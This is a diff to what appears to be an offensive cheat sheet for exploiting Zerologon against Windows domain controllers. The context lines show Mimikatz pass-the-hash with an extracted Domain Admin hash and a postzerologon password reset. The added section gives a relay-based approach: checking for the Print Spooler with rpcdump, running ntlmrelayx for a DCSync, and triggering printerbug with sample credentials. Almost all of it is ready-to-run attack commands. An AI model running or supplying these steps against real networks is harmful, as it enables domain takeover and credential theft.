@@ -51,3 +51,23 @@
 #### 5) sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN (Pass The Hash with the extracted Domain Admin hash)
 
 #### 6) lsadump::postzerologon /target:DC_IP /account:DC01$ (Reset password. Use IP address instead of FQDN to force NTLM with Windows APIs)
+
+### A 2nd approach to exploit zerologon is done by relaying authentication.
+
+## Prerequisites:
+
+ - A domain account
+
+ - One DC running the PrintSpooler service
+
+ - Another DC vulnerable to zerologon
+
+ - ntlmrelayx and any tool such as printerbug.py
+
+## Steps:
+
+#### 1) rpcdump.py 10.10.10.10 | grep -A 6 "spoolsv" (Check if one DC is running the PrintSpooler service)
+
+#### 2) ntlmrelayx.py -t dcsync://DOMAIN_CONTROLLER.LOCAL -smb2support (Setup ntlmrelay in one shell)
+
+#### 3) python3 printerbug.py 'DOMAIN.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12 (Trigger printerbug in 2nd shell)
